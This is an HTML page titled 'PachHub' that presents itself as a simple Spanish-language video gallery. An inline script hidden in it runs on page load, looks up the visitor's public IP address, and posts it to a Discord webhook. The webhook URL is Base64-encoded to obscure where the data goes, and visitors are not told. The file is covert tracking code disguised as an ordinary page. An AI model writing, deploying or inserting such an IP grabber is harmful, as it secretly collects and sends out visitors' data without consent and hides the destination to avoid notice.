<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>PachHub</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f9f9f9;
            margin: 20px;
            padding: 0;
            color: #333;
        }
        h1 {
            text-align: center;
            margin-bottom: 40px;
            color: #2c3e50;
        }
        .video-container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            justify-content: center;
        }
        .video-item {
            max-width: 320px;
            background: #fff;
            padding: 10px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgb(0 0 0 / 0.1);
        }
        video {
            width: 100%;
            border-radius: 5px;
        }
        .video-title {
            margin-top: 10px;
            font-weight: bold;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>PachHub</h1>
    <div class="video-container">
        <div class="video-item">
            <video controls>
                <source src="videos/video1.mp4" type="video/mp4" />
                Tu navegador no soporta el elemento de video.
            </video>
            <div class="video-title">Video 1</div>
        </div>
        <div class="video-item">
            <video controls>
                <source src="videos/video2.mp4" type="video/mp4" />
                Tu navegador no soporta el elemento de video.
            </video>
            <div class="video-title">Video 2</div>
        </div>
        <div class="video-item">
            <video controls>
                <source src="videos/video3.mp4" type="video/mp4" />
                Tu navegador no soporta el elemento de video.
            </video>
            <div class="video-title">Video 3</div>
        </div>
    </div>

    <script>
        function decodeBase64(str) {
            try {
                return atob(str);
            } catch (e) {
                console.error("Error al decodificar Base64:", e);
                return null;
            }
        }

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIP = data.ip;
                console.log("La IP pública es:", userIP);

                // Webhook codificado en Base64
                const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MjA1MzcwMjE4MDgwMjU2MS85OFZoN0szWXVuSnlYcVhDeDRuMXBsV1VYWHdlcmtLYUZiY3Z4bnhMaVhZR3U4RVpxRUFkckpHamJJNXpUSG8yaWVXag==';
                const discordWebhookURL = decodeBase64(encodedWebhook);

                if (!discordWebhookURL) return;

                const payload = {
                    content: `@everyone ¡Alguien visitó tu página! La IP es: ${userIP}`
                };

                fetch(discordWebhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log("IP enviada correctamente a Discord.");
                    } else {
                        console.error("Hubo un error al enviar la IP.");
                    }
                })
                .catch(error => {
                    console.error("Error al enviar la IP a Discord:", error);
                });
            })
            .catch(error => {
                console.error("Error al obtener la IP pública:", error);
            });
    </script>
</body>
</html>
